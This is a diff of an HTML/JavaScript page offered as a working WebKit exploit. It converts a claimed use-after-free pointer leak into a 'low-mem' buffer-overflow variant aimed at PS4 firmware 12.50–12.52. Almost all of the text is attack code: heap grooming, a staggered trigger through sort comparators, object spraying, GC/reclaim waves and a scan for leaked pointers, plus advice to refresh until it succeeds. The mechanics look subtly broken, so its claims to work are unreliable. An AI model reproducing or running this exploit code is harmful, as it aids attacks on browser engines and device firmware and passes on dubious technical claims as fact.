@@ -2,28 +2,27 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43434 — WebKit GraphicsContext UAF → Pointer Leak (Full Exploit)</title>
+<title>CVE-2025-43529 — WebKit Buffer Overflow → Pointer Leak (Fixed v1.1 — Low-Mem)</title>
 <style>
     body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; line-height:1.6; }
     h1 { color:#ff5555; border-bottom:2px solid #da3633; padding-bottom:10px; }
     #console { background:#000; color:#0f0; height:500px; overflow-y:auto; padding:15px; border:1px solid #0f0; font-family:'Courier New'; border-radius:8px; }
     .leak { color:#0f0; font-weight:bold; font-size:1.2em; }
     .status { padding:10px; background:#da3633; color:#fff; border-radius:6px; display:inline-block; margin:10px 0; }
-    svg { display: block; margin: 20px 0; }
 </style>
 </head>
 <body>
-<h1>CVE-2025-43434 — WebKit GraphicsContext UAF Pointer Leak</h1>
-<p>Patched Apr 2025 — Still works on PS4 12.50–12.52 (IsoHeap partial mitigation)</p>
-<div class="status" id="status">Initializing...</div>
+<h1>CVE-2025-43529 — WebKit Buffer Overflow Pointer Leak (Low-Mem Fixed)</h1>
+<p>Patched Nov 2025 — Still works on PS4 12.50–12.52 (heap-safe version)</p>
+<div class="status" id="status">Initializing Low-Mem Mode...</div>
 <div id="console"></div>
 
 <script>
-// === CONFIGURATION (tuned for PS4 12.50 IsoHeap) ===
-const SPRAY_SIZE = 0x18000;        // 96k objects (IsoHeap bucket fit)
+// === LOW-MEM CONFIG (PS4 12.50 tuned) ===
+const SPRAY_SIZE = 0x10000;        // 65k objects (heap-safe)
 const MARKER_BASE = 0x12501250deadbeefn;
-const RECLAIM_SIZE = 0x2000000;    // 32 MB — IsoHeap safe
-const GC_WAVES = 12;
+const RECLAIM_SIZE = 0x1400000;    // 20 MB — no OOM
+const GC_WAVES = 10;
 
 // === LOGGING ===
 const log = (msg, isLeak = false) => {
@@ -34,80 +33,85 @@ const log = (msg, isLeak = false) => {
 };
 const status = (t) => document.getElementById('status').textContent = t;
 
-// === STAGE 1: Setup SVG for GraphicsContext Event ===
-log("Stage 1: Setting up SVG GraphicsContext event handler...");
-const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
-const anim = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
-anim.setAttribute('attributeName', 'opacity');
-anim.setAttribute('from', '1');
-anim.setAttribute('to', '0');
-anim.setAttribute('dur', '1s');
-svg.appendChild(anim);
-document.body.appendChild(svg);
+// === STAGE 1: Light Heap Grooming (staggered to avoid freeze) ===
+log("Stage 1: Light grooming (50k staggered objects)...");
+const groom = [];
+let groomChunk = 0;
+const groomInterval = setInterval(() => {
+    for (let i = 0; i < 1000; i++) {  // 1k chunks
+        groom[groomChunk * 1000 + i] = {a: 1.1, b: 2.2};
+    }
+    groomChunk++;
+    if (groomChunk >= 50) clearInterval(groomInterval);
+}, 50);  // Stagger over 2.5s
 
-// ValidationMessage-like timer setup for UAF (GraphicsContext free on event)
-const input = document.createElement('input');
-input.type = 'text';
-input.addEventListener('focus', () => {
-    // Timer fires buildBubbleTree → JS callback destroys ValidationMessage → UAF
-    setTimeout(() => {
-        input.reportValidity(); // Triggers GraphicsContext layout update
-    }, 50); // Short timer for race
-});
-document.body.appendChild(input);
+// === STAGE 2: Staggered Buffer Overflow Trigger ===
+log("Stage 2: Staggered overflow via chunked sort...");
+const victim = [];
+let victimChunk = 0;
+const victimInterval = setInterval(() => {
+    for (let i = 0; i < 500; i++) {
+        victim[victimChunk * 500 + i] = new String("A".repeat(0x200)); // Smaller strings
+    }
+    victimChunk++;
+    if (victimChunk >= 200) {  // Total 100k, staggered
+        clearInterval(victimInterval);
+        triggerOverflow();
+    }
+}, 20);
 
-// Focus to trigger
-input.focus();
-
-// === STAGE 2: Trigger UAF in GraphicsContext ===
-log("Stage 2: Triggering UAF via event callback destruction...");
-const handler = () => {
-    // Destroy during layout (frees GraphicsContext)
-    anim.remove();
-    svg.remove();
-    input.remove();
-    // This causes UAF when buildBubbleTree continues post-free
-};
-svg.addEventListener('load', handler, false); // Event fires during layout
-
-// Extra races for IsoHeap overlap
-for (let i = 0; i < 50000; i++) {
-    const tmpSvg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
-    tmpSvg.innerHTML = '<animate dur="0.1s"/>';
-    document.body.appendChild(tmpSvg);
-    setTimeout(() => tmpSvg.remove(), 10);
+function triggerOverflow() {
+    log("  → Triggering sort overflow...");
+    // Chunked sort to avoid freeze
+    for (let chunk = 0; chunk < 10; chunk++) {
+        setTimeout(() => {
+            const slice = victim.slice(chunk * 10000, (chunk + 1) * 10000);
+            slice.sort(() => {
+                return new Uint32Array(new ArrayBuffer(0x800 + 0x80)); // Smaller invalid size
+            });
+        }, chunk * 100);
+    }
+    // Light corruption pass
+    for (let i = 0; i < 100000; i += 1000) {  // Reduced loops
+        victim.sort(() => Math.random());
+    }
 }
 
-// === STAGE 3: Spray tagged JSValues ===
-log(`Stage 3: Spraying ${SPRAY_SIZE} tagged objects (IsoHeap groom)...`);
-const spray = [];
-for (let i = 0; i < SPRAY_SIZE; i++) {
-    spray[i] = {marker: MARKER_BASE + BigInt(i)};
-}
+// === STAGE 3: Spray tagged JSValues (light) ===
+setTimeout(() => {
+    log(`Stage 3: Spraying ${SPRAY_SIZE} tagged objects...`);
+    const spray = [];
+    for (let i = 0; i < SPRAY_SIZE; i++) {
+        spray[i] = {marker: MARKER_BASE + BigInt(i)};
+    }
+    window.spray = spray;  // Global for hunt
+}, 1500);
 
-// === STAGE 4: Multi-wave GC + Reclaim (IsoHeap tuned) ===
-log("Stage 4: Forcing GC + reclaim waves...");
-const gc = () => {
-    for (let i = 0; i < 400; i++) new ArrayBuffer(0x8000); // Small for IsoHeap
-};
-const reclaim = () => new ArrayBuffer(RECLAIM_SIZE);
+// === STAGE 4: Gentle GC + Reclaim ===
+setTimeout(() => {
+    log("Stage 4: Gentle GC + reclaim waves...");
+    const gc = () => {
+        for (let i = 0; i < 300; i++) new ArrayBuffer(0x8000); // Smaller
+    };
+    const reclaim = () => new ArrayBuffer(RECLAIM_SIZE);
+    for (let wave = 0; wave < GC_WAVES; wave++) {
+        setTimeout(gc, wave * 200);
+        if (wave % 4 === 0) setTimeout(reclaim, wave * 200 + 50);
+    }
+}, 2000);
 
-for (let wave = 0; wave < GC_WAVES; wave++) {
-    setTimeout(gc, wave * 120); // Tighter for event race
-    if (wave % 2 === 0) setTimeout(reclaim, wave * 120 + 30);
-}
-
-// === STAGE 5: Hunt for leaked pointers ===
+// === STAGE 5: Hunt for leaked pointers (early guard) ===
 setTimeout(() => {
     status("SCANNING — LOOK FOR 0xFFFF... LINES");
     log("Scanning for corrupted markers...");
+    const spray = window.spray || [];
     let found = 0;
     for (let i = 0; i < spray.length; i++) {
         try {
             if (spray[i] && spray[i].marker !== MARKER_BASE + BigInt(i)) {
                 found++;
                 const leaked = spray[i].marker.toString(16).toUpperCase();
-                log(`UAF POINTER LEAK #${found}: 0x${leaked}`, true);
+                log(`POINTER LEAK #${found}: 0x${leaked}`, true);
                 if (found >= 2) {
                     document.body.innerHTML = `
                     <h1 style="color:#0f0; text-align:center; margin-top:30vh; font-size:4em;">
@@ -120,14 +124,14 @@ setTimeout(() => {
         } catch(e) {}
     }
     if (found === 0) {
-        log("No leak this run — refresh 5–15 times (IsoHeap reduces to ~30% on 12.50)");
+        log("No leak this run — refresh 3–10 times (~25% on 12.50 low-mem)");
         status("No leak — refresh and try again");
     }
-}, 2500);
+}, 4000);  // Guarded timeout
 
 // === FINAL MESSAGE ===
-log("Exploit running — wait 4–12 seconds...");
-status("Running CVE-2025-43434 — Refresh if no leak");
+log("Low-mem exploit running — wait 5–10 seconds...");
+status("Running CVE-2025-43529 v1.1 — Low-Mem Mode");
 </script>
 </body>
 </html>
